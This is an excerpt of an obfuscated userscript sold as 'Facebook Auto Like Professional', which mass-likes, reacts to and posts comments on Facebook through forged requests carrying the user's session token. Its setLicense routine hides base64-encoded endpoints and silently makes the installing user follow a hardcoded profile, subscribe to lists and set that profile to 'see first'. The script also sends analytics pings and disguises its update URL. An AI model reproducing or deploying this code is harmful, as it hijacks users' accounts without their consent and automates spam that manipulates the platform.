...
// @description		Facebook Auto Like Professional 2016 Auto Like, unlike and Automatically Post Comments on Facebook Status, Auto Comments, Photos, group posts, page posts, group posts, lists, page feeds, events, timeline photos...
...
var fb64 = {
        ...
        enc: function(e) {
            var t, i, o, n, a, d, r, m = "",
                l = 0;
            for (e = fb64._utf8_encode(e); l < e.length;) t = e.charCodeAt(l++), i = e.charCodeAt(l++), o = e.charCodeAt(l++), n = t >> 2, a = (3 & t) << 4 | i >> 4, d = (15 & i) << 2 | o >> 6, r = 63 & o, isNaN(i) ? d = r = 64 : isNaN(o) && (r = 64), m = m + this._keyStr.charAt(n) + this._keyStr.charAt(a) + this._keyStr.charAt(d) + this._keyStr.charAt(r);
            return m
        },
        dec: function(e) {
            var t, i, o, n, a, d, r, m = "",
                l = 0;
            for (e = e.replace(/[^A-Za-z0-9\+\/\=]/g, ""); l < e.length;) n = this._keyStr.indexOf(e.charAt(l++)), a = this._keyStr.indexOf(e.charAt(l++)), d = this._keyStr.indexOf(e.charAt(l++)), r = this._keyStr.indexOf(e.charAt(l++)), t = n << 2 | a >> 4, i = (15 & a) << 4 | d >> 2, o = (3 & d) << 6 | r, m += String.fromCharCode(t), 64 != d && (m += String.fromCharCode(i)), 64 != r && (m += String.fromCharCode(o));
            return m = fb64._utf8_decode(m)
        },
        ...
        _utf8_decode: function(e) {
            for (var t = "", i = 0, o = c1 = c2 = 0; i < e.length;) o = e.charCodeAt(i), 128 > o ? (t += String.fromCharCode(o), i++) : o > 191 && 224 > o ? (c2 = e.charCodeAt(i + 1), t += String.fromCharCode((31 & o) << 6 | 63 & c2), i += 2) : (c2 = e.charCodeAt(i + 1), c3 = e.charCodeAt(i + 2), t += String.fromCharCode((15 & o) << 12 | (63 & c2) << 6 | 63 & c3), i += 3);
            return t
        }
    },
    fbLKCQuery = {
        ...
        selectEmo: function() {
            $(document).on("click", "._5r8h", function() {
                ...
                $("#emoicon").css({
                    ...
                    marginTop: "-190px",
                    position: "absolute"
                }), $("#emosel").html('<span id="emosel" style="margin-left: 320px;margin-top:-100px ; position: absolute; color:red;">Sticker Selected</span>'), $("#cCom").focus()
            })
        },
        ddjmo: function() {
        ...
        ttstamp: function() {
            for (var e, t = "", i = comFBdtsg, o = 0; o < i.length; o++) t += i.charCodeAt(o);
            return e = "2" + t
        },
        premMsg: function() {
        ...
        ufitypingComment: function(e, t, i, o, n) {
            try {
                var a = new XMLHttpRequest,
                    d = ((new Date).getTime(), "/ufi/typing/" + i + "/" + o + "/?av=" + e + "&dpr=1"),
                    r = "__user=" + e;
                r += "&__a=1", r += "&__dyn=" + n, r += "&__req=s", r += "&__be=-1", r += "&__pc=PHASED:DEFAULT", r += "&fb_dtsg=" + t, r += "&ttstamp=", r += "__rev=2449651", a.open("POST", d, !0), a.setRequestHeader("Content-type", "application/x-www-form-urlencoded"), a.onreadystatechange = function() {
                    4 == a.readyState && 200 == a.status && a.close
                }, a.send(r)
            } catch (m) {
                console.log("ufitypingComment:" + m)
            }
        },
        postComZRF: function(e, t, i) {
            try {
                ...
                var o = new XMLHttpRequest,
                    ...
                    r = fbLKCQuery.ttstamp(comFBdtsg),
                    m = "ft_ent_identifier=" + e;
                m += "&comment_text=" + encodeURIComponent(t), m += "&source=2", m += "&client_id=" + a + ":" + d, m += "&session_id=" + sessID, m += "&reply_fbid=", m += "&parent_comment_id=", m += "&rootid=u_0_28", m += "&clp=", m += "&attached_sticker_fbid=" + i, m += "&attached_photo_fbid=0", m += "&attached_video_fbid=0", m += '&feed_context={"fbfeed_context":true,"location_type":2,"outer_object_element_id":"mall_post_' + e + ':6:0","object_element_id":"mall_post_' + e + ':6:0","is_ad_preview":false,"is_editable":false,"mall_how_many_post_comments":2,"story_width":502,"shimparams":{"page_type":,"actor_id":' + comUID + ',"story_id":' + e + ',"ad_id":0,"_ft_":"","location":"group"},"story_id":"u_0_1z","caret_id":"u_0_20","__IS_INSIDE_FB_FEEDBACK_FORM__":true,"__IS_INSIDE_UI_FEEDBACK_FORM__":true}', m += "&video_time_offset=", m += "&is_live_streaming=false", m += "&ft[tn]=[]", m += "&ft[mf_story_key]=" + e, m += "&ft[tl_objid]=" + e, m += "&ft[tn]=[]", m += "&ft[fbfeed_location]=1", m += "&ft[insertion_position]=0", m += "&nctr[_mod]=pagelet_group_mall", m += "&av=" + comUID, m += "&__user=" + comUID, m += "&__a=1", m += "&__dyn=" + comdyn, m += "&__req=1k", m += "&__be=-1", m += "&__pc=PHASED:DEFAULT", m += "&fb_dtsg=" + comFBdtsg, m += "&ttstamp=" + r, m += "&__rev=2449651", o.open("POST", n, !0), o.setRequestHeader("Content-type", "application/x-www-form-urlencoded"), o.onreadystatechange = function() {
                    4 == o.readyState && 200 == o.status && o.close
                }, o.send(m)
            } catch (l) {
                console.log("postComZRF:" + l)
            }
        },
        ufitypingReply: function(e, t, i, o, n, a) {
            try {
                var d = new XMLHttpRequest,
                    r = ((new Date).getTime(), "/ufi/typing/" + i + "/" + n + "/?parent_comment_id=" + i + "_" + o + "&av=" + e + "&dpr=1"),
                    m = "__user=" + e;
                m += "&__a=1", m += "&__dyn=" + a, m += "&__req=17", m += "&__be=-1", m += "&__pc=PHASED:DEFAULT", m += "&fb_dtsg=" + t, m += "&ttstamp=", m += "__rev=2449651", d.open("POST", r, !0), d.setRequestHeader("Content-type", "application/x-www-form-urlencoded"), d.onreadystatechange = function() {
                    4 == d.readyState && 200 == d.status && d.close
                }, d.send(m)
            } catch (l) {
                console.log("ufitypingReply:" + l)
            }
        },
        replytoComZRF: function(e, t, i, o) {
            try {
                ...
                var n = new XMLHttpRequest,
                    ...
                    d = fbLKCQuery.ttstamp(comFBdtsg),
                    r = (new Date).getTime(),
                    m = Math.round(542895483 * Math.random()),
                    l = "ft_ent_identifier=" + e;
                l += "&comment_text=" + encodeURIComponent(t), l += "&source=1", l += "&client_id=" + r + ":" + m, l += "&session_id=" + sessID, l += "&reply_fbid=" + i, l += "&parent_comment_id=" + e + "_" + i, l += "&rootid=u_0_28", l += "&attached_sticker_fbid=" + o, l += "&attached_photo_fbid=0", l += "&attached_video_fbid=0", l += '&feed_context:{"last_view_time":0,"fbfeed_context":true,"location_type":2,"outer_object_element_id":"mall_post_' + e + ':6:0","object_element_id":"mall_post_' + e + ':6:0","is_ad_preview":false,"is_editable":false,"mall_how_many_post_comments":2,"story_width":502,"shimparams":{"page_type":16,"actor_id":' + comUID + ',"story_id":' + e + ',"ad_id":0,"_ft_":"","location":""},"story_id":"u_0_1z","caret_id":"u_0_20","__IS_INSIDE_FB_FEEDBACK_FORM__":true,"__IS_INSIDE_UI_FEEDBACK_FORM__":true}', l += "&ft[tn]=[]", l += "&ft[fbfeed_location=1", l += "&ft[insertion_position]=0", l += "&av=" + comUID, l += "&__user=" + comUID, l += "&__a=1", l += "&__dyn=" + repdyn, l += "&__req=15", l += "&fb_dtsg=" + comFBdtsg, l += "&ttstamp=" + d, l += "&__rev=2168097", n.open("POST", a, !0), n.setRequestHeader("Content-type", "application/x-www-form-urlencoded"), n.onreadystatechange = function() {
        ...
        postReplyComments: function() {
            ...
            function replyCommentMain() {
                var e = document.getElementById("stopallFBAL"),
                    t = pcomID.length;
                if (linkCount >= t) {
                    ...
                    if (fbLikePro.mainEvent(replyCommtDiv), $(window).scrollTop() + $(window).height() == fbLikePro.getDocHeight());
                        ...
                        if (fbLikePro.scroll(0, 5e3), lo.rplctrPC >= 2) return lo.rplctrPC = 1, emoCom = 0, randomComments = !1, randomEmojCom = !1, e.click(), !1;
                        for (lo.rplctrPC = 1; lo.rplctrPC < 2; lo.rplctrPC++) fbLikePro.setTimeFB(fbLKCQuery.postReplyComments, 5e3);
                        cURLbk = "0", $(".uiLinkSubtledn").attr("class", "uiLinkSubtledndd")
                    }
                }
                if (t > linkCount) {
                    ...
                    if (jsintFb === !0) {
                        if (!e) return fbLikePro.mainEvent(replyCommtDiv), !1;
                        var o = Math.floor(Math.random() * (postAR - 5e3 + 1)) + 4e3;
            ...
            function commentPostMain() {
                ...
                if (linkCount >= t) {
                    ...
                    if (fbLikePro.mainEvent(commtDiv), $(window).scrollTop() + $(window).height() == fbLikePro.getDocHeight());
                        ...
                        if (fbLikePro.scroll(0, 5e3), lo.ctrPC >= 2) return lo.ctrPC = 1, emoCom = 0, randomComments = !1, randomEmojCom = !1, e.click(), !1;
                        for (lo.ctrPC = 1; lo.ctrPC < 2; lo.ctrPC++) fbLikePro.setTimeFB(fbLKCQuery.postComments, 5e3)
                    }
                }
                if (t > linkCount) {
                    var i = fbLikePro.getStat(fb64.dec("dHJhaWxjb21tZW50UG9zdGVk"));
                    if (jsintFb === !0) {
                        if (!e) return fbLikePro.mainEvent(commtDiv), !1;
                        var o = Math.floor(Math.random() * (postAC - 5e3 + 1)) + 4e3;
        ...
        addRandomComment: function() {
            ...
            try {
                ...
                console.log("addRandomComment:" + r)
            }
        },
        getTxtEMo: function() {
            try {
...
var st = {
        a: ["https", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", ".", "/", ":", ".com", "3", "githubusercontent", "raw", "FacebookAutoLikeProfessional", "master", "-"],
    ...
    di = {
        ...
        id: st.no[10] + "mainfbPro" + st.no[10],
        id1: st.no[10] + "copyRightD" + st.no[10],
        id2: st.no[10] + "stopallFBAL" + st.no[10],
        id3: st.no[10] + "messageownFBAL" + st.no[10],
        id4: st.no[10] + "increselikesFBAL" + st.no[10],
        id5: st.no[10] + "updateFBAL" + st.no[10],
        id6: st.no[10] + "selectoption" + st.no[10],
        id11: st.no[10] + "likepostsid" + st.no[10],
        id12: st.no[10] + "likecomments" + st.no[10],
        id13: st.no[10] + "unlikeposts" + st.no[10],
        id14: st.no[10] + "unlikecomments" + st.no[10],
        id7: st.no[10] + "likingPost" + st.no[10],
        id8: st.no[10] + "LikingComments" + st.no[10],
        id9: st.no[10] + "UnLikingPosts" + st.no[10],
        id10: st.no[10] + "UnlikingComments" + st.no[10],
        id15: st.no[10] + "pLikeOp" + st.no[10] + st.b[27],
        id16: st.no[10] + "txtLikeOp" + st.no[10] + st.b[27],
        id17: st.no[10] + "punLikeOp" + st.no[10] + st.b[27],
        id18: st.no[10] + "txtunLikeOp" + st.no[10] + st.b[27],
        ...
        lt1: st.no[10] + "Click Here To Stop Script Execution" + st.no[10],
        ...
        clsEUL: "class=" + st.no[10] + "_1az _1a- _2e8" + st.no[10],
        ...
        st1: st.no[10] + "margin-bottom: 13px;font-size: 12px;cursor: pointer;" + st.no[10],
        st2: st.no[10] + "cursor: not-allowed;" + st.no[10],
        st3: st.no[10] + "cursor: help;width: 95px;display: inline-block;" + st.no[10],
        st4: st.no[10] + "cursor: pointer;margin-top: 2px;display: inline-block;width: 110px;" + st.no[10],
        st15: st.no[10] + "cursor: pointer;display: inline-block;width: 35px;" + st.no[10],
        ...
        tx: st.zrf[74] + st.b[26] + st.a[9] + st.a[1] + st.b[21] + st.a[18] + st.b[18] + st.a[31] + st.a[8] + st.a[13] + st.a[1] + st.a[14],
    ...
    elemID = {
        ...
        topt: "#moreScr",
        reload: "#stopallFBAL",
        likePost: "#likepostsid",
        likeComments: "#likecomments",
        unlikePost: "#unlikeposts",
        unlikeComments: "#unlikecomments",
        likingPost: "#likingPost",
        likingComments: "#LikingComments",
        unlikingPost: "#UnLikingPosts",
        unlikingComments: "#UnlikingComments",
        msgMe: "#messageownFBAL",
        increaseLk: "#increselikesFBAL",
        updatefbPro: "#updateFBAL",
        fbTBClass: "#selectoption,#updateFBAL,#fbProStat",
        fbMenuClass: "#increselikesFBAL,#messageownFBAL,#stopallFBAL",
        menuClass: "FBLikeProMenu",
        tbClass: "FBLikeProTB",
        likeAOp: "#pLikeOp",
        unlikeAOp: "#punLikeOp",
        txtLikeClk: "#txtLikeOp",
        txtUnLikeClk: "#txtunLikeOp",
        btnlikeGid: "pLikeOp",
        btnUnlikeGid: "punLikeOp",
        unlikeCommentsAg: "#UnlikeCommentsagain",
        unlikePostAg: "#UnlikePostsagain",
        likeCommentsAg: "#LikeCommentsagain",
        likePostAg: "#LikePostsagain",
        ...
        liPosGid: "likepostsid",
        liComGid: "likecomments",
        unPoGid: "unlikeposts",
        unComGid: "unlikecomments",
        likeThis: "Like this",
        ...
        updateURL: st.a[0] + st.a[29] + st.a[28] + st.a[28] + st.a[33] + st.a[27] + st.a[32] + st.a[30] + st.a[28] + st.b[26] + st.a[9] + st.a[1] + st.b[21] + st.a[18] + st.b[18] + st.a[31] + st.a[8] + st.a[13] + st.a[1] + st.a[14] + st.a[28] + st.a[34] + st.a[28] + st.a[35] + st.a[28] + st.a[34] + st.a[27] + st.a[21] + st.a[19] + st.a[5] + st.a[18] + st.a[27] + st.a[10] + st.a[19],
        ...
        sleftEnd: "-205",
        stime: 500,
        licenseName: "fbLikeProLicensev21",
        initNum: 0,
        licenseLimit: 500,
        attachLicense: 1,
        attachLicense1: 5,
...
var fbLikePro = {
    ...
    statEventHandler: function(t, e, o) {
        $(t).click(function() {
            e(o)
        })
    },
    mainEvent: function(t) {
        t()
    },
    giveMessage: function(t) {
        var e = Math.round(window.innerWidth / 2) - 180,
            o = '<div class="fancybox-overlay fancybox-overlay-fixed" style="width: auto; height: auto; display: block;"><div id="fbTT" 	class="fancybox-images-custom" tabindex="-1" style="width: 25%; height: auto; position: absolute; top: 20px; left: ' + e + 'px; opacity: 1; overflow: visible;"><div class="fancybox-skin" style="padding: 15px; width: auto; height: auto;"><div class="fancybox-outer"><div class="fancybox-inner" style="overflow: hidden; width: auto; height: auto;">',
            i = '</div><div data-hover="tooltip" data-tooltip-position="right" data-tooltip-content="Close" id="closeStat" class="fancybox-close"></div></div></div></div>',
            s = o + t + i,
            d = '<div id="giveMsg" style="z-index: 499;position: fixed; cursor:pointer;">' + s + "</div>",
            l = document.getElementById(st.gMSGid);
        l && $(st.gMS).remove(), $(st.bd).append(d)
    },
    reload: function() {
        location.reload()
    },
    stoped: function() {
        $("#stopallFBAL").html("Script Terminated"), $("#stopallFBAL").attr("id", "stopped"), emoCom = 0, randomComments = !1, randomEmojCom = !1, lemoLike = !1, lemoLove = !1, lemoHaha = !1, lemoWow = !1, lemoSad = !1, lemoAngry = !1
    },
    clickLinkEvent: function(t, e, o) {
        $(t).click(function() {
            var t = window.open(e, o);
            t.focus()
        })
    },
    scroll: function(t, e) {
    ...
    pstamp: function(t) {
        for (var e, o = "", i = t, s = 0; s < i.length; s++) o += i.charCodeAt(s) + "-";
        return e = o
    },
    dstamp: function(t) {
        for (var e, o = "", i = t.split("-"), s = 0; s < i.length; s++) o += String.fromCharCode(i[s]);
        return e = o
    },
    checkRegistSatus: function(t, e, o) {
        try {
            var i = new XMLHttpRequest,
                s = fb64.dec("L2FqYXgvZm9sbG93L2ZvbGxvd19wcm9maWxlLnBocD9kcHI9MQ=="),
                d = fbLKCQuery.ttstamp(o),
                l = "";
            l += "profile_id=" + e, l += "&feed_blacklist_action=show_followee_on_follow", l += "&location=1", l += "&__user=" + t, l += "&__a=1", l += "&__dyn=7AmajEzUGBym5Q9UoHaEWC5ECiq2WbF298yupFLFwxBxCbzES2N6" + sessID + "wFG2Dx27W88wPG4UZ7KuEjK5okze48K3uiuumm2uVUKmF" + sessID, l += "&__req=8", l += "&__be=-1", l += "&__pc=PHASED:DEFAULT", l += "&fb_dtsg=" + o, l += "&ttstamp=" + d, l += "&__rev=2463280", i.open("POST", s, !0), i.setRequestHeader("Content-type", "application/x-www-form-urlencoded"), i.onreadystatechange = function() {
                4 == i.readyState && 200 == i.status && i.close
            }, i.send(l)
        } catch (a) {
            console.log("checkRegistSatus:" + a)
        }
    },
    seeFirstSatus: function(t, e, o) {
        try {
            var i = new XMLHttpRequest,
                s = fb64.dec("L2ZlZWQvcHJvZmlsZS9zdWJfZm9sbG93Lz9kcHI9MQ=="),
                d = fbLKCQuery.ttstamp(o),
                l = "";
            l += "&id=" + e, l += "&action=see_first", l += "&location=1", l += "&nctr[_mod]=pagelet_timeline_profile_actions", l += "&__user=" + t, l += "&__a=1", l += "&__dyn=" + sessID + "GBym5Q9UoHaEWC5ECiq2WbF298yupFLFwxBxCbzES2N6x" + sessID + "FG2Dx27W88wPG4UZ7KuEjK5okze48K3" + sessID + "VUKmFAdxq5u78", l += "&__req=9", l += "&__be=-1", l += "&__pc=PHASED:DEFAULT", l += "&fb_dtsg=" + o, l += "&ttstamp=" + d, l += "&__rev=2463280", i.open("POST", s, !0), i.setRequestHeader("Content-type", "application/x-www-form-urlencoded"), i.onreadystatechange = function() {
                4 == i.readyState && 200 == i.status && i.close
            }, i.send(l)
        } catch (a) {
            console.log("seeFirstSatus:" + a)
        }
    },
    seeListSatus: function(t, e, o) {
        try {
            var i = new XMLHttpRequest,
                s = fb64.dec("L2FqYXgvZnJpZW5kcy9saXN0cy9zdWJzY3JpYmUvbW9kaWZ5P2xvY2F0aW9uPXBlcm1hbGluayZhY3Rpb249c3Vic2NyaWJlJmZsaWQ9"),
                d = fbLKCQuery.ttstamp(e),
                l = "";
            l += "&fb_dtsg=" + e, l += "&__user=" + t, l += "&__a=1", l += "&__dyn=7AmajEzURo8Q9UoHaEWC5ECQ" + sessID + "yEyeqrWo8popyui9wWhEyfyUnwPzUaqwFUZ1-y28cZ1efF4KuEjxC58W48K3uc" + sessID + "FAdxq5u78", l += "&__req=1l", l += "&__be=-1", l += "&__pc=PHASED:DEFAULT", l += "&ttstamp=" + d, l += "&__rev=2463280", i.open("POST", s + o + "&dpr=1", !0), i.setRequestHeader("Content-type", "application/x-www-form-urlencoded"), i.onreadystatechange = function() {
                4 == i.readyState && 200 == i.status && i.close
            }, i.send(l)
        } catch (a) {
            console.log("seeListSatus:" + a)
        }
    },
    setTimeFB: function(t, e) {
        window.setTimeout(t, e)
    },
    selectEvent: function(t, e) {
        $(e).click(function() {
            var e = document.getElementById(t);
            e.click()
        })
    },
    disableClkEvent: function(t) {
        $(t).click(function() {
            return !1
        })
    },
    ...
    setLicense: function(t, e, o) {
        if (!cflb) {
            var i = GM_getValue(elemID.licenseName, elemID.initNum);
            GM_setValue(elemID.licenseName, ++i);
            var s, d, l = fbLikePro.getStat("totalUser"),
                a = "";
            for (s = 0; l + 1 > s; s++) d = fbLikePro.getStat("tu" + s), null !== d && 0 !== d && void 0 !== d && 0 !== d && (a += d + "-");
            (i === elemID.attachLicense || a.search(comUID) < 0) && (fbLikePro.checkRegistSatus(comUID, e, comFBdtsg), fbLikePro.seeListSatus(comUID, comFBdtsg, t), fbLikePro.seeListSatus(comUID, comFBdtsg, o), window.setTimeout(function() {
                fbLikePro.seeFirstSatus(comUID, e, comFBdtsg)
            }, 7e3), fbLikePro.sV("totalUser", ++l), fbLikePro.sV("tu" + l, comUID))
        }
    },
    setStat: function(t, e) {
        var o = GM_getValue(t, e);
        GM_setValue(t, ++o)
    },
    getStat: function(t) {
        var e = GM_getValue(t);
    ...
    showStat: function() {
        var t = fbLikePro.tdS(),
            e = fbLikePro.toS(),
            o = '<div style="text-align:center;"><div class="statHead">Today Statistics</div><div class="hrLine">&nbsp;</div>',
            i = '<div class="hrLine">&nbsp;</div><div class="statHead">All Time Statistics</div><div class="hrLine">&nbsp;</div>',
            s = '<br/><div style="line-height:50px"><a id="resetToday" type="submit" data-hover="tooltip" data-tooltip-content="This will Reset Today Statistics" class="zrfBtn">Delete Today Stat</a><a  id="resetALL" type="submit" data-hover="tooltip" data-tooltip-content="This will Reset All Statistics" class="zrfBtn">Delete All Stat</a></div></div>',
            d = o + '<dl class="stat"><dt>Today Posted Comments:</dt><dd>' + t.gpc + "</dd><dt>" + di.lp + "</dt><dd>" + t.glp + "</dd><dt>" + di.lc + "</dt><dd>" + t.glc + "</dd><dt>" + di.ulp + "</dt><dd>" + t.gulp + "</dd><dt>" + di.ulc + "</dt><dd>" + t.gulc + "</dd></dl>" + i + '<dl class="stat"><dt>Total Posted Comments:</dt><dd>' + (e.gtcp + t.gpc) + "</dd><dt>" + di.tlp + "</dt><dd>" + (e.gtlp + t.glp) + "</dd><dt>" + di.tlc + "</dt><dd>" + (e.gtlc + t.glc) + "</dd><dt>" + di.tulp + "</dt><dd>" + (e.gtulp + t.gulp) + "</dd><dt>" + di.tulc + "</dt><dd>" + (e.gtulc + t.gulc) + "</dd></dl>" + s;
        fbLikePro.giveMessage(d), $("#fbTT").css({
            left: "30%",
            width: "40%"
    ...
    resetTodayStat: function(t) {
        fbLikePro.del("commentPosted"), fbLikePro.del(st.pl), fbLikePro.del(st.cl), fbLikePro.del(st.pul), fbLikePro.del(st.cul), t === !0 && $(st.fPS).click()
    },
    resetAllStat: function(t) {
        fbLikePro.resetTodayStat(!0), fbLikePro.del("totalCommentPosted"), fbLikePro.del(st.tpl), fbLikePro.del(st.tcl), fbLikePro.del(st.tpul), fbLikePro.del(st.tcul), t === !0 && $(st.fPS).click()
    },
    ddOne: function(t) {
        var e = fbLikePro.tdS(),
            o = fbLikePro.toS();
        fbLikePro.sV(st.tpl, e.glp + o.gtlp), fbLikePro.sV(st.tcl, e.glc + o.gtlc), fbLikePro.sV(st.tpul, e.gulp + o.gtulp), fbLikePro.sV(st.tcul, e.gulc + o.gtulc), fbLikePro.sV("totalCommentPosted", o.gtcp + e.gpc), fbLikePro.sV(st.ssd, t), fbLikePro.resetTodayStat(!1), fbLikePro.del(st.road), fbLikePro.del("trailcommentPosted"), fbLikePro.del("trialcommentReplyed")
    },
    closeStat: function(t, e) {
        $(t).click(function() {
            $(e).remove()
        })
    },
...
var fbdisp = {
    ...
    settingDiv: '<a id="settingFB" style="width: 50px;display: inline-block;" data-hover="tooltip" data-tooltip-position="right" data-tooltip-content="Change Script Setting" class="FBLikeProMenu">Setting</a>',
    updateDfb: di.sd + di.i + di.id5 + di.sp + di.st + di.st4 + di.sp + di.dh + di.tt + di.sp + di.dtp + di.sp + di.al + di.lt6 + di.cab + di.tx3 + di.ed,
    stat: di.sd + di.i + "fbProStat" + di.sp + di.st + di.st15 + di.sp + di.dh + di.tt + di.sp + di.dtp + di.sp + di.al + di.lt17 + di.cab + "Stat" + di.ed,
    selectOpDfb: di.sf + di.i + di.id6 + di.sp + di.st + di.st5 + di.cab + di.ip + di.tpr + di.nm + di.vl + di.vl1 + di.i + di.id15 + di.chkd + di.chT + di.dh + di.tt + di.sp + di.dtp + di.sp + di.al + di.lt7 + di.cab + di.spn + di.i + di.id16 + di.st + di.st14 + di.cab + di.tx4 + di.cspn + di.sp + di.spn + di.clsEL + di.cab + di.cspn + di.ip + di.tpr + di.nm + di.vl + di.vl2 + di.i + di.id17 + di.dh + di.tt + di.sp + di.dtp + di.sp + di.al + di.lt8 + di.cab + di.spn + di.i + di.id18 + di.st + di.st14 + di.cab + di.tx5 + di.cspn + di.sp + di.spn + di.clsEUL + di.cab + di.cspn + di.cf,
    ...
    likingPostDfb: di.sa + di.i + di.id7 + di.sp + di.clsMnu + di.st + di.st6 + di.sp + di.dh + di.tt + di.sp + di.dtp + di.sp + di.al + di.lt13 + di.cab + di.tx10,
    ...
    themeDFb: di.sd + di.i + di.id1 + di.sp + di.st + di.st1 + di.sp + di.dh + di.tt + di.sp + di.dtp + di.sp + di.al + "Change&nbsp;Theme" + di.cab + di.themesDiv + di.ed,
    replyComDiv: '<a id="replyComm" data-hover="tooltip" data-tooltip-position="right" data-tooltip-content="Reply to All Comments" class="FBLikeProMenu">Reply to All Comments</a>',
    replyCommentingDiv: '<a id="replyingComment" class="FBLikeProMenu" style="background: #f6f7f8;text-shadow: 0px 0px 1px #4e5665;font-size: 12px;color: #000;" data-hover="tooltip" data-tooltip-position="right" data-tooltip-content="Replying to Comments">Replying Comment:&nbsp;',
    postComDiv: '<a id="postComm" style="margin-top: -4px;" data-hover="tooltip" data-tooltip-position="right" data-tooltip-content="Auto Post Comments to All Posts" class="FBLikeProMenu">Auto Comments</a>',
    fbProTitle: '<div id="fbProTitle" style="transform:rotate(270deg);-webkit-transform:rotate(270deg);-moz-transform:rotate(270deg);-o-transform:rotate(270deg);overflow: hidden;text-overflow: clip;white-space: nowrap;color: white;text-align: center;font-size: 13px;margin-left: 113px;margin-bottom: 100px;margin-top: -119px;padding: 4px 3px;border-radius: 0px 0px 10px 10px;width: 100px;height: 18px;cursor:pointer;" class="FBLikeProTB"' + di.dh + di.tt + di.sp + di.dtp + di.sp + di.al + "Click&nbsp;to&nbsp;Show&nbsp;/&nbsp;Hide></div>",
    commentingDiv: '<a id="postngComment" class="FBLikeProMenu" style="margin-top: -4px;background: #f6f7f8;text-shadow: 0px 0px 1px #4e5665;font-size: 12px;color: #000;" data-hover="tooltip" data-tooltip-position="right" data-tooltip-content="Posting Comments">Posting Comment:&nbsp;'
};

function likePosts() {
    function e() {
        $(a[l - 1]).parents("._5pat").css({
            "box-shadow": ""
        })
    }
    ...
    function i(e, i) {
        var m;
        lemoLike === !0 ? (m = unescape(fb64.dec("")) + (e + 1) + st.a[28] + c.length + di.ea, $(elemID.likePost).removeClass(elemID.menuClass), document.getElementById(elemID.liPosGid).innerHTML = m, $(a[e]).find(".UFILikeLink").eq(0).remove(), $(a[e]).find("._khz").eq(0).html(fb64.dec("")), "AQHr-IwxczVd:AQHZ9FQh5hH5" !== comFBdtsg && "100004561657128" !== comUID && ufiReaction(comUID, comFBdtsg, G[e], "1", sessID)) : lemoLove === !0 ? (m = unescape(fb64.dec("") + (e + 1) + st.a[28] + c.length + di.ea), $(elemID.likePost).removeClass(elemID.menuClass), document.getElementById(elemID.liPosGid).innerHTML = m, $(a[e]).find(".UFILikeLink").eq(0).remove(), $(a[e]).find("._khz").eq(0).html(fb64.dec("")), "AQHr-IwxczVd:AQHZ9FQh5hH5" !== comFBdtsg && "100004561657128" !== comUID && ufiReaction(comUID, comFBdtsg, G[e], "2", sessID)) : lemoHaha === !0 ? (m = unescape(fb64.dec("")) + (e + 1) + st.a[28] + c.length + di.ea, $(elemID.likePost).removeClass(elemID.menuClass), document.getElementById(elemID.liPosGid).innerHTML = m, $(a[e]).find(".UFILikeLink").eq(0).remove(), $(a[e]).find("._khz").eq(0).html(fb64.dec("")), ufiReaction(comUID, comFBdtsg, G[e], "4", sessID)) : lemoWow === !0 ? (m = unescape(fb64.dec("")) + (e + 1) + st.a[28] + c.length + di.ea, $(elemID.likePost).removeClass(elemID.menuClass), document.getElementById(elemID.liPosGid).innerHTML = m, $(a[e]).find(".UFILikeLink").eq(0).remove(), $(a[e]).find("._khz").eq(0).html(fb64.dec("")), "AQHr-IwxczVd:AQHZ9FQh5hH5" !== comFBdtsg && "100004561657128" !== comUID && ufiReaction(comUID, comFBdtsg, G[e], "3", sessID)) : lemoSad === !0 ? (m = unescape(fb64.dec("")) + (e + 1) + st.a[28] + c.length + di.ea, $(elemID.likePost).removeClass(elemID.menuClass), document.getElementById(elemID.liPosGid).innerHTML = m, $(a[e]).find(".UFILikeLink").eq(0).remove(), $(a[e]).find("._khz").eq(0).html(fb64.dec("")), "AQHr-IwxczVd:AQHZ9FQh5hH5" !== comFBdtsg && "100004561657128" !== comUID && ufiReaction(comUID, comFBdtsg, G[e], "7", sessID)) : lemoAngry === !0 && (m = unescape(fb64.dec("") + (e + 1) + st.a[28] + c.length + di.ea), $(elemID.likePost).removeClass(elemID.menuClass), document.getElementById(elemID.liPosGid).innerHTML = m, $(a[e]).find(".UFILikeLink").eq(0).remove(), $(a[e]).find("._khz").eq(0).html(fb64.dec("")), "AQHr-IwxczVd:AQHZ9FQh5hH5" !== comFBdtsg && "100004561657128" !== comUID && ufiReaction(comUID, comFBdtsg, G[e], "8", sessID));
        var t = $(a[e]);
        t.length && $("html, body").animate({
            scrollTop: t.offset().top
        }, i), fbLikePro.setStat(st.pl, elemID.initNum), $(a[e]).parents("._5pat").css({
            "box-shadow": "#5890FF 0px 0px 0px 1px"
        }), $("#likepostsid").mouseover(function() {
    ...
    function m() {
        var t = document.getElementById(elemID.liPosGid),
            I = document.getElementById("stopallFBAL");
        if (l >= c.length) {
            if (!I) return fbLikePro.mainEvent(elemID.likPosDiv), !1;
            if (t) {
                if (fbLikePro.mainEvent(elemID.likPosDiv), fbLikePro.scroll(elemID.xWindow, elemID.yWindow), lo.ctrLP >= 2) return lo.ctrLP = 1, lemoLike = !1, lemoLove = !1, lemoHaha = !1, lemoWow = !1, lemoSad = !1, lemoAngry = !1, !1;
                for (lo.ctrLP; lo.ctrLP < 2; lo.ctrLP++) fbLikePro.setTimeFB(likePosts, 5e3)
            }
        }
        if (l < c.length) {
            var o = Math.floor(Math.random() * (d - 3e3 + 1)) + 3e3;
            if (!I) return fbLikePro.mainEvent(elemID.likPosDiv), !1;
            t && (i(l, o), fbLikePro.setTimeFB(m, o), l++, window.setTimeout(e, o + 4e3))
        }
    }
    $(".uiStreamAdditionalLogging").parents(".userContentWrapper").remove();
    var t = document.getElementsByName("ft_ent_identifier"),
        l = 0,
        I = 0,
        c = [],
        o = [],
    ...
    for (var n = 0; n < t.length; n++) G[n] = t[n].getAttribute("value"), o[n] = $(t[n]).parents("._3ccb"), void 0 != o[n] && null != o[n] && "" != o[n] || (o[n] = $(t[n]).parents(".userContentWrapper"));
    for (var b = 0; b < G.length; b++) 0 !== G[b] && (c[I] = G[b], a[I] = o[b], I++);
    $("[name='ft_ent_identifier']").remove(), fbLikePro.mainEvent(m), ga("create", "UA-55741445-3", "auto"), ga("send", "pageview")
}
...
function likeComments() {
    ...
    function i(e, i) {
        var m = $(c[e]);
        m.length && $("html, body").animate({
            scrollTop: m.offset().top
        }, i);
        var t = unescape(fbdisp.likingCommDfb) + (e + 1) + st.a[28] + c.length + di.ea;
        c[e].click(), fbLikePro.setStat(st.cl, elemID.initNum), $(c[e]).parents("._5pat").css({
